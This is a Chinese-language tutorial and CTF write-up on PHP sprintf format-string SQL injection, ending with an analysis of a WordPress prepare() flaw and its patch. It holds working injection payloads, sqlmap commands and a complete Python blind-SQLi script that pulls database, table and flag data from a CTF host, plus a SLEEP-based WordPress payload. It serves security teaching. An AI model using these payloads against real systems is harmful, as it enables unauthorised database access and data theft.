原创：threepwn合天智汇

## 0x01 sprintf()讲解  

### 首先我们先了解sprintf()函数  

> sprintf() 函数把格式化的字符串写入变量中。  
>
    
    
    sprintf(format,arg1,arg2,arg++)
    arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。
    注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 "\$" 组成。

### 通过几个例子回顾一下sprintf  

> 例子1：  
>
    
    
    <?php
    $number = 123;
    $txt = sprintf("带有两位小数：%1\$.2f<br>不带小数：%1\$u",$number);
    echo $txt;
    ?>
    输出结果:
    带有两位小数：123.00 
    不带小数：123

> 例子2：  
>
    
    
    <?php
    $num1 = 123456789;
    $num2 = -123456789;
    $char = 50;
    // ASCII 字符 50 是 2
    //注释：格式值 "%%" 返回百分号
    echo sprintf("%%b = %b",$num1)."<br>"; // 二进制数
    echo sprintf("%%c = %c",$char)."<br>"; // ASCII 字符
    echo sprintf("%%s = %s",$num1)."<br>"; // 字符串
    echo sprintf("%%x = %x",$num1)."<br>"; // 十六进制数（小写）
    echo sprintf("%%X = %X",$num1)."<br>"; // 十六进制数（大写）
    ?>
    
    输出结果:
    %b = 111010110111100110100010101
    %c = 2  //注意var_dump('2')为string
    %s = 123456789
    %x = 75bcd15
    %X = 75BCD15

## 0x02 sprintf注入原理  

### 底层代码实现  

> 我们来看一下sprintf()的底层实现方法  
>
    
    
    switch (format[inpos]) {
    case 's': {
    zend_string *t;
    zend_string *str = zval_get_tmp_string(tmp, &t);
    php_sprintf_appendstring(&result, &outpos,ZSTR_VAL(str),width, precision, padding,alignment,ZSTR_LEN(str),0, expprec, 0);
    zend_tmp_string_release(t);
    break;
        }
        case 'd':
            php_sprintf_appendint(&result, &outpos,
                                  zval_get_long(tmp),
                                  width, padding, alignment,
                                  always_sign);
            break;
    
        case 'u':
            php_sprintf_appenduint(&result, &outpos,
                                  zval_get_long(tmp),
                                  width, padding, alignment);
            break;
    
        case 'g':
        case 'G':
        case 'e':
        case 'E':
        case 'f':
        case 'F':
            php_sprintf_appenddouble(&result, &outpos,
                                     zval_get_double(tmp),
                                     width, padding, alignment,
                                     precision, adjusting,
                                     format[inpos], always_sign
                                    );
            break;
    
        case 'c':
            php_sprintf_appendchar(&result, &outpos,
                                (char) zval_get_long(tmp));
            break;
    
        case 'o':
            php_sprintf_append2n(&result, &outpos,
                                 zval_get_long(tmp),
                                 width, padding, alignment, 3,
                                 hexchars, expprec);
            break;
    
        case 'x':
            php_sprintf_append2n(&result, &outpos,
                                 zval_get_long(tmp),
                                 width, padding, alignment, 4,
                                 hexchars, expprec);
            break;
    
        case 'X':
            php_sprintf_append2n(&result, &outpos,
                                 zval_get_long(tmp),
                                 width, padding, alignment, 4,
                                 HEXCHARS, expprec);
            break;
    
        case 'b':
            php_sprintf_append2n(&result, &outpos,
                                 zval_get_long(tmp),
                                 width, padding, alignment, 1,
                                 hexchars, expprec);
            break;
    
        case '%':
            php_sprintf_appendchar(&result, &outpos, '%');
    
            break;
        default:
            break;
    }

> 可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：
> 没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\,
> 最后%\（或%1$\）被替换为空 因此sprintf注入，或者说php格式化字符串注入的原理为：
> 要明白%后的一个字符(除了%，%上面表格已经给出了)都会被当作字符型类型而被吃掉，也就是被当作一个类型进行匹配后面的变量，比如%c匹配asciii码，%d匹配整数，如果不在定义的也会匹配，匹配空，比如%\，这样我们的目的只有一个，使得单引号逃逸，也就是能够起到闭合的作用。  
>

### 这里我们举两个例子  

### NO.1  

> 不使用占位符号  
>
    
    
    <?php
    $sql = "select * from user where username = '%\' and 1=1#';" ;
    $args = "admin" ;
    echo  sprintf ( $sql , $args ) ;
    //=> echo sprintf("select * from user where username = '%\' and 1=1#';", "admin");
    //此时%\回去匹配admin字符串，但是%\只会匹配空
    运行后的结果
    select * from user where username = '' and 1=1#'

### NO.2  

> 使用占位符号  
>
    
    
    <?php
    $input = addslashes ("%1$' and 1=1#" );
    $b = sprintf ("AND b='%s'", $input );
    $sql = sprintf ("SELECT * FROM t WHERE a='%s' $b ", 'admin' );
    //对$input与$b进行了拼接
    //$sql = sprintf ("SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' ", 'admin' );
    //很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空
    echo  $sql ;
    运行后的结果
    SELECT * FROM t WHERE a='admin' AND b='' and 1=1#'

> 对于这个问题，我们还可以这样写  
>
    
    
    $sql = sprintf ("SELECT * FROM table WHERE a='%1$\' AND b='%d' and 1=1#' ",'admin');
    //result: SELECT * FROM t WHERE a='admin' AND b='' and 1=1#'

> 第一个格式化处匹配时为空，会让给后面的格式化匹配 以上两个例子是吃掉'\'来使得单引号逃逸出来 下面这个例子我们构造单引号  
>

### NO.3  

> 对%c进行利用  
>
    
    
    <? php
    $input1 = '%1$c) OR 1 = 1 /*' ;
    $input2 = 39 ;
    $sql = "SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s" ;
    $sql = sprintf ( $sql , $input2 );
    echo  $sql ;

> %c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。 所以结果为：  
>
    
    
    SELECT * FROM foo WHERE bar IN ('') OR 1 = 1 /*) AND baz = 39

### 小结  

> 漏洞利用条件 1. sql语句进行了字符拼接 2. 拼接语句和原sql语句都用了vsprintf/sprintf 函数来格式化字符串  
>
    
    
    ps:
    mysql> SELECT ascii('\'');
    +-------------+
    | ascii('\'') |
    +-------------+
    |          39 |
    +-------------+

## 0x03 题目训练  

### 一道注入题目  

![v2-c7fc3e6064e77a40b59e1de80fa59cc4_720w](https://pic4.zhimg.com/80/v2-c7fc3e6064e77a40b59e1de80fa59cc4_720w.png)

> 形式很像SQL注入，而且题目中提示为SQLI 先试了一下弱口令，确定username为admin
> 那么就对username与password进行注入，开始普通注入，二次解码，宽字节，过滤空格，过滤关键字等姿势进行构造注入语句都无果，而且还耗费大量的时间，不过后来get到一种姿势，使用burpsuit的intruder跑一下，来查看那些字母或者字符没有被过滤掉（waf字典）
> 后来发现%可疑，于是拿出来repeater一下  
>

![v2-0dfd0800c87b18421eb4c886cd41d738_720w](https://pic1.zhimg.com/80/v2-0dfd0800c87b18421eb4c886cd41d738_720w.png)

sprintf函数出错，那么sprintf是什么，格式化字符串，于是乎就懂得其中的原理了，是其单引号逃逸 构造username=admin%1$\' and
1=2# 与 username=admin%1$\' and 1=1# 发现如下的结果

![v2-ec620029bdd874bde052bada39e049b8_720w](https://pic3.zhimg.com/80/v2-ec620029bdd874bde052bada39e049b8_720w.png)

![v2-5680cb977e734c0307e789df63b95729_720w](https://pic4.zhimg.com/80/v2-5680cb977e734c0307e789df63b95729_720w.png)

可以发现'后面的语句带入执行了，这就是注入点，使用sqlmap跑一下 事先抓取post包

    
    
    python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10

![v2-185f79117af7a6f98a65c0e375bfa3c3_720w](https://pic1.zhimg.com/80/v2-185f79117af7a6f98a65c0e375bfa3c3_720w.png)

> 于是对ctf进行跑tables 得到  
>

![v2-dceba937b8e3032664a11330c9bdc31d_720w](https://pic1.zhimg.com/80/v2-dceba937b8e3032664a11330c9bdc31d_720w.png)

对flag跑columns 得到

![v2-347b75238108724c0ce974131290fec0_720w](https://pic1.zhimg.com/80/v2-347b75238108724c0ce974131290fec0_720w.png)

对每个列进行dump但是dump下来不对，找了一波原因没有找到，开始用脚本跑 跑完后才发现sqlmap跑出来的列不对，应该是flag，于是

    
    
    python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10

> 才得到正确结果 ：） 下面是脚本跑的  
>

![v2-cf0f728461c6976ec56b10aa5a6d0f73_720w](https://pic4.zhimg.com/80/v2-cf0f728461c6976ec56b10aa5a6d0f73_720w.png)

做实验

利用sqlmap进行POST注入

<http://hetianlab.com/expc.do?ce=1336a6fb-7b18-4dd6-8a6d-b9a7ae92f73d>

（了解sqlmap，掌握sqlmap的常用命令，学会使用sqlmap进行POST注入攻击）

### 中心思想  

> 先判断length 然后使用ascii判断字母 ascii(substr(database()," + str(i) +",1))=" +
> str(ord(c)) + "#" 使用这个语句进行判断 涉及到的一些知识点：  
>

![v2-fabc876c7f2a2b0bc4c21c66be21e8c0_720w](https://pic1.zhimg.com/80/v2-fabc876c7f2a2b0bc4c21c66be21e8c0_720w.png)

![v2-3f60c8e2196ed4d1b642a3aa66b9f195_720w](https://pic1.zhimg.com/80/v2-3f60c8e2196ed4d1b642a3aa66b9f195_720w.png)

![v2-b46237e9211c9c01538d9af93f8adc12_720w](https://pic3.zhimg.com/80/v2-b46237e9211c9c01538d9af93f8adc12_720w.png)

### 代码  

    
    
    #coding:utf-8
    import requests
    import string
    
    def boom():
        url = r'http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/'
        s = requests.session()
        //会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。
        dic = string.digits + string.letters + "!@#$%^&*()_+{}-="
        right = 'password error!'
        error = 'username error!'
        lens = 0
        i = 0
        //确定当前数据库的长度
        while True:
            payload = "admin%1$\\' or " + "length(database())>" + str(i) + "#"
            data={'username':payload,'password':1}
            r = s.post(url,data=data).content
            if error in r:
                lens=i
                break
            i+=1
            pass
        print("[+]length(database()): %d" %(lens))
        //确定当前数据库的名字
        strs=''
        for i in range(lens+1):
            for c in dic:
                payload = "admin%1$\\' or " + "ascii(substr(database()," + str(i) +",1))=" + str(ord(c)) + "#"
                data = {'username':payload,'password':1}
                r = s.post(url,data=data).content
                if right in r:
                    strs = strs + c
                    print strs
                    break
            pass
        pass
        print("[+]database():%s" %(strs))
    
        lens=0
        i = 1
        while True:
            payload = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>" + str(i) + "#"
            //对当前的数据库，查询第一个表的长度
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if error in r:
                lens = i
                break
            i+=1
            pass
        print("[+]length(table): %d" %(lens))
    
        strs=''
        for i in range(lens+1):
            for c in dic:
                payload = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(i) +",1))=" + str(ord(c)) + "#"
                // 数字一定要str才可以传入
                data = {'username':payload,'password':1}
                r = s.post(url,data=data).content
                if right in r:
                    strs = strs + c
                    print strs
                    break
            pass
        pass
        print("[+]table_name:%s" %(strs))
        tablename = '0x' + strs.encode('hex')
        //编码为16进制
        table_name = strs
    
        lens=0
        i = 0
        while True:
            payload = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name = " + str(tablename) + " limit 0,1)>" + str(i) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if error in r:
                lens = i
                break
            i+=1
            pass
        print("[+]length(column): %d" %(lens))
    
        strs=''
        for i in range(lens+1):
            for c in dic:
                payload = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_name = " + str(tablename) +" limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
                data = {'username':payload,'password':1}
                r = s.post(url,data=data).content
                if right in r:
                    strs = strs + c
                    print strs
                    break
            pass
        pass
        print("[+]column_name:%s" %(strs))
        column_name = strs
    
        num=0
        i = 0
        while True:
            payload = "admin%1$\\' or " + "(select count(*) from " + table_name + ")>" + str(i) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if error in r:
                num = i
                break
            i+=1
            pass
        print("[+]number(column): %d" %(num))
    
        lens=0
        i = 0
        while True:
            payload = "admin%1$\\' or " + "(select length(" + column_name + ") from " + table_name + " limit 0,1)>" + str(i) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if error in r:
                lens = i
                break
            i+=1
            pass
        print("[+]length(value): %d" %(lens))
    
        i=1    
        strs=''
        for i in range(lens+1):
            for c in dic:
                payload = "admin%1$\\' or ascii(substr((select flag from flag limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
                data = {'username':payload,'password':'1'}
                r = s.post(url,data=data).content
                if right in r:
                    strs = strs + c
                    print strs
                    break
            pass
        pass
        print("[+]flag:%s" %(strs))
    
    if __name__ == '__main__':
        boom()
        print 'Finish!'
    <?php
    $input = addslashes("%1$' and 1=1#");
    echo $input;
    echo "\n";
    $b = sprintf("AND b='%s'",$input);
    echo $b;
    echo "\n";
    $sql = sprintf("select * from t where a='%s' $b",'admin');
    echo $sql;
    
    >>>结果
    %1$\' and 1=1#
    AND b='%1$\' and 1=1#'
    select * from t where a='admin' AND b='' and 1=1#'

> 格式字符%后面会吃掉一个\即%1$\被替换为空，逃逸出来一个单引号，造成注入.  
>

## 0x04 Wordpress格式化字符串漏洞  

### 漏洞跟踪  

> wordpress版本小于4.7.5在后台图片删除的地方存在一处格式化字符串漏洞 官方在4.7.6已经给出了补救办法
> 在我们即将要说的地方增加了这么一端代码  
>
    
    
    $query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents

> 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位 首先 我们找到upload.php
> 可以发现在deleta中 $post_id_del（比如int()） 未经过处理，直接传入  
>
    
    
    case 'delete':
        if ( !isset( $post_ids ) )
            break;
        foreach ( (array) $post_ids as $post_id_del ) {
            if ( !current_user_can( 'delete_post', $post_id_del ) ) //跟进
                wp_die( __( 'Sorry, you are not allowed to delete this item.' ) );
    
            if ( !wp_delete_attachment( $post_id_del ) )
                wp_die( __( 'Error in deleting.' ) );
        }
        $location = add_query_arg( 'deleted', count( $post_ids ), $location );
        break;

> 跟进wp_delete_attachment( )函数 其中参数$post_id_del为图片的postid wp_delete_attachment(
> )中 调用了delete_metadata 函数  
>
    
    
    function wp_delete_attachment( $post_id, $force_delete = false ) {
    .......
    delete_metadata( 'post', null, '_thumbnail_id', $post_id, true ); // delete all for any posts.
    ......
    }

> 继续跟进delete_metadata函数 漏洞触发点主要在wp-includes/meta.php 的 delete_metadata函数里面，
> 有如下代码:  
>
    
    
    if ( $delete_all ) {
        $value_clause = '';
        if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
            $value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
        }
    
        $object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
    }

> 调用了两个prepare函数 跟进prepare函数  
>
    
    
    public function prepare( $query, $args ) {
        if ( is_null( $query ) )
            return;
        // This is not meant to be foolproof -- but it will catch obviously incorrect usage.
        if ( strpos( $query, '%' ) === false ) {
            _doing_it_wrong( 'wpdb::prepare', sprintf( __( 'The query argument of %s must have a placeholder.' ), 'wpdb::prepare()' ), '3.9.0' );
    }
        $args = func_get_args();
        array_shift( $args );
        // If args were passed as an array (as in vsprintf), move them up
        if ( isset( $args[0] ) && is_array($args[0]) )
            $args = $args[0];
        $query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
        $query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
        $query = preg_replace( '|(?<!%)%f|' , '%F', $query ); // Force floats to be locale unaware
        $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s
        array_walk( $args, array( $this, 'escape_by_ref' ) );
        return @vsprintf( $query, $args );
    }

> 详细看prepare函数对传入参数的处理过程 首先对%s进行处理  
>
    
    
    $query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
        $query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
        $query = preg_replace( '|(?<!%)%f|' , '%F', $query ); // Force floats to be locale unaware
        $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s

> 把'%s'替换为%s，然后再把"%s"替换成%s，替换为浮点数%F 把%s替换成'%s' 最后再进行vsprintf( $query, $args );
> 对拼接的语句进行格式化处理 我们一步步分析 假设传入的$meta_value为'admin'  
>
    
    
    $wpdb->prepare( " AND meta_value = %s", $meta_value );

> 经过prepare函数处理后得到  
>
    
    
    vsprintf( " AND meta_value = '%s'",'admin')
    =>  AND meta_value = 'admin'

> return到上一级函数后，继续执行这一条拼接语句：  
>

$wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s
$value_clause", $meta_key )

> 经过prepare函数处理后得到  
>
    
    
    vsprintf( "SELECT $type_column FROM $table WHERE meta_key = '%s'  AND meta_value = 'admin'",'admin')
    => SELECT $type_column FROM $table WHERE meta_key = 'admin'  AND meta_value = 'admin'

> 看起来一切都很正常，毫无bug 但是我们可以思考一下，怎样使其形成注入呢？s> 或者说怎样逃逸一个单引号？ 在之前我们先看一下，可控变量
> $post_id_del 的路线  
>
    
    
    $post_id_del => $post_id => $meta_value => $args => $query

> 显然这里面两处admin都有单引号，而且两处都与 $post_id_del 联系，如何来选择？ 对于第一处单引号
> 它是通过一次替换处理得到的，显然是对单引号>无法处理 对于第二处单引号
> 经过两次的替换，（这里的意思是执行了两次的替换代码，可能第二段代码对他没有起到实质性的作用，仅仅是去点单引号然后又加上单引号）
> 但是这一出经过了两次处理是必须的，那么我们是否能够是构造出另一个单引号（此时第二处有三个单引号）就可以闭合前面的单引号了
> 最重要的是，第二次的替换处理的变量是可控的，因此要引入单引号，我们需要$meta_value含有%s 那么第一次的结果为  
>
    
    
    AND meta_value = 'X%sY'（其中XY为未知量）
    //这里需要注意，为什么%s不被单引号围起来，我看过一篇博客，它是写的'%s'，这显然是错的，为什么呢？我们生成了'%s'是没错，不过还原一下过程就知道了，首先我们生成了AND meta_value = '%s'，注意此时与$meta_value没有半毛钱关系，后来的vsprintf后，才与$meta_value有了关系，原来的%s被替换成了X%sY，值得注意的是这里的%s没有经过任何处理，处理是在第二轮进行的，这是后话。

> 第二次后的结果为  
>
    
    
    SELECT $type_column FROM $table WHERE meta_key = 'admin'  AND meta_value = 'X'%s'Y'
    （对于第二处的%s我们先不要带入格式化后的值，其实真实的语句应该为：
    SELECT $type_column FROM $table WHERE meta_key = 'admin'  AND meta_value = 'X'admin'Y'）

> 分析到这里，相信大家应该知道传值（$meta_value）使单引号逃逸出来了吧
> admin显然是多余的，那么我们需要把它放在单引号里面，因此第二个单引号需要去掉，那么第四个单引号需要注释掉，这就很轻而易举地构造sql语句 AND
> meta_value = 'Xadmin'Y Y里面就是我们注入的代码  
>

### 漏洞利用  

> 怎么去传值呢？ 利用格式化字符串漏洞 去掉第二个单引号就需要使该单引号成为%后的第一个字符，也就是%'，但是我们还需要一个占位符，%1$'
> 这样就没有报错的去掉了该单引号 所以我们构造的payload为  
>
    
    
    $meta_value = %1$%s AND SLEEP(5)#
    => AND meta_value = '%1$%s AND SLEEP(5)'
    => "SELECT $type_column FROM $table WHERE meta_key = '%s' AND meta_value = AND meta_value = '%1$'%s' AND SLEEP(5)#'",'admin'
    其中 %1$' => 空
    => SELECT $type_column FROM $table WHERE meta_key = 'admin'  AND meta_value = AND meta_value = 'admin' AND SLEEP(5)#'
    成功利用该漏洞形成时间注入

### 漏洞修补  

> 现在我们说一下第四部分开头的补救方法 后来官方在prepare函数加了这一代码  
>
    
    
    $query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents

> 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位  
>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

